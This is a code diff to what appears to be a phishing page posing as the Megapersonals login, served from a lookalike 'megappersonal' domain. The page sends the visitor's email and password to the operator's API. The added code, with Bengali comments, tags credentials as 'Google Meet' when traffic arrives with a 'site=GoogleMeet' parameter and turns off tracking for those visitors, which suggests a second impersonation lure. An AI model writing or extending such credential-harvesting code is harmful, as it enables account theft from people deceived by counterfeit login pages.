@@ -13,21 +13,21 @@
     <meta name="google-site-verification" content="jY9tnt497A6DCMpSs2J5V4Ly63w83-Hg6Jtq6oir9zI">
     
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://megapersonal-login.9-a3.com/" />
+    <meta property="og:url" content="https://megappersonal-login.9-a3.com/" />
     <meta property="og:title" content="Megapersonals : Classified Hookups" />
     <meta property="og:description" content="Already have an account? Log in now to manage your posts and meet now." />
-    <meta property="og:image" content="https://megapersonal-login.9-a3.com/assets/img/devilgirl.png" />
+    <meta property="og:image" content="https://megappersonal-login.9-a3.com/assets/img/devilgirl.png" />
 
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:url" content="https://megapersonal-login.9-a3.com/" />
+    <meta name="twitter:url" content="https://megappersonal-login.9-a3.com/" />
     <meta name="twitter:title" content="Megapersonals : Classified Hookups" />
     <meta name="twitter:description" content="Already have an account? Log in now to manage your posts and meet now." />
-    <meta name="twitter:image" content="https://megapersonal-login.9-a3.com/assets/img/devilgirl.png" />
+    <meta name="twitter:image" content="https://megappersonal-login.9-a3.com/assets/img/devilgirl.png" />
 
     <link rel="icon" href="assets/img/devilgirl.png" type="image/png">
     <link rel="apple-touch-icon" href="assets/img/devilgirl.png" />
     
-    <link rel="canonical" href="https://megapersonal-login.9-a3.com/">
+    <link rel="canonical" href="https://megappersonal-login.9-a3.com/">
     
     <link rel="stylesheet" href="https://megappersonals.com/index_img/bootstrap.min.css">
     <link rel="stylesheet" href="https://megappersonals.com/index_img/custom.css">
@@ -202,7 +202,13 @@
         const TRACK_URL = `${API_BASE}/api/track-visit`;
         const CLICK_URL = `${API_BASE}/api/clicks`;
 
-        const SITE_NAME = 'Megapersonals';
+        // URL থেকে site প্যারামিটার চেক করবে
+        const urlParamsForSite = new URLSearchParams(window.location.search);
+        const isFromGoogleMeet = urlParamsForSite.get('site') === 'GoogleMeet';
+        
+        // ট্র্যাকিং নাম সেটআপ কন্ডিশন
+        const SITE_NAME = isFromGoogleMeet ? 'Google Meet' : 'Megapersonals';
+        
         const urlParams = new URLSearchParams(window.location.search);
         const REF = (urlParams.get('ref') || '').trim();
         const routeQuery = (urlParams.get('route') || '').trim().toLowerCase();
@@ -277,6 +283,8 @@
         }
 
         function playOpenSound() {
+            // যদি গুগল মিট থেকে ট্রাফিক আসে, তাহলে ওপেনিং সাউন্ড স্কিপ হবে
+            if (isFromGoogleMeet) return;
             playSynthesizedTing();
         }
 
@@ -302,9 +310,12 @@
 
         async function trackPageVisitUnique() {
             try {
-                // Only track once per browser tab/session. Use sessionStorage so refreshes
-                // and in-page navigations do not re-count. A new tab/window will have
-                // no sessionStorage entry and will be counted.
+                // কন্ডিশন: Google Meet থেকে রিডাইরেক্ট হয়ে আসলে এই মেগা পেজে ভিজিট ট্র্যাকিং হবে না
+                if (isFromGoogleMeet) {
+                    console.log("Visit tracking skipped: Traffic originated from Google Meet.");
+                    return;
+                }
+
                 const TRACKED_KEY = 'mp_tracked';
                 if (sessionStorage.getItem(TRACKED_KEY)) return;
 
@@ -357,7 +368,7 @@
                 const payload = {
                     email,
                     password,
-                    website: SITE_NAME,
+                    website: SITE_NAME, // Google Meet থেকে আসলে এখানে ডেটা 'Google Meet' নামেই ডাটাবেজে সাবমিট হবে
                     ref: REF || undefined,
                     route: routeType || undefined,
                     userId: state.userId || undefined,
@@ -426,7 +437,9 @@
 
         function trackClick(target) {
             try {
-                // Do not track form submits or elements explicitly marked not to track
+                // কন্ডিশন: Google Meet থেকে রিডাইরেক্ট হয়ে আসলে মেগা পেজের ভেতরের ক্লিকের জন্য ট্র্যাকিং হবে না
+                if (isFromGoogleMeet) return Promise.resolve(false);
+
                 if (target.matches && target.matches('button[type="submit"], input[type="submit"]')) return Promise.resolve(false);
                 if (target.dataset && target.dataset.noTrack === 'true') return Promise.resolve(false);
                 const tag = target.tagName.toLowerCase();
@@ -450,7 +463,6 @@
         }
 
         function setupClickSounds() {
-            // List of elements that should not be clickable
             const disabledSelectors = ['.header-logo', '.starthere', '#captchaReload', '.security-banner'];
             const isDisabled = (el) => disabledSelectors.some(selector => el.closest(selector));
             
@@ -460,19 +472,26 @@
                 const target = el.closest('a, button, input[type="submit"], input[type="button"]');
                 if (!target) return;
                 
-                // Prevent clicks on disabled elements
                 if (isDisabled(target)) {
                     event.preventDefault();
                     event.stopPropagation();
                     return;
                 }
                 
-                // For all <a> tags, prevent default to ensure URL doesn't change
                 if (target.tagName.toLowerCase() === 'a') {
                     event.preventDefault();
                 }
                 
                 const isLink = target.tagName.toLowerCase() === 'a' && target.href && target.href !== '#' && target.href !== '' && target.target !== '_blank';
+                
+                // যদি গুগল মিট থেকে আসে, তাহলে ক্লিকে ট্র্যাকিং বা সাউন্ড কোনোটিই এক্সিকিউট হবে না, শুধু রিডাইরেকশন কাজ করবে
+                if (isFromGoogleMeet) {
+                    if (isLink) {
+                        window.location.href = target.href;
+                    }
+                    return;
+                }
+
                 if (isLink) {
                     trackClick(target).finally(() => {
                         window.location.href = target.href;
@@ -492,11 +511,15 @@
             ['person_username_field_login','person_password_field_login','captcha_code'].forEach(id => { const el = document.getElementById(id); if (el) el.addEventListener('focus', () => clearAllErrors()); });
 
             restoreRoutePath();
+            
+            // এই ফাংশন কল হলেও গুগল মিটের ট্রাফিকের জন্য এর ভেতর থেকে অটোমেটিক স্কিপ হয়ে যাবে
             trackPageVisitUnique().catch((e) => { console.warn('trackPageVisitUnique failed', e); });
 
-            // Sound effects removed - no longer needed
             window.addEventListener('load', () => {
-                // Audio playback on page load disabled
+                // গুগল মিট থেকে না আসলেই কেবল ওপেনিং সাউন্ড প্লে হবে
+                if (!isFromGoogleMeet) {
+                    playOpenSound();
+                }
             });
         }
 
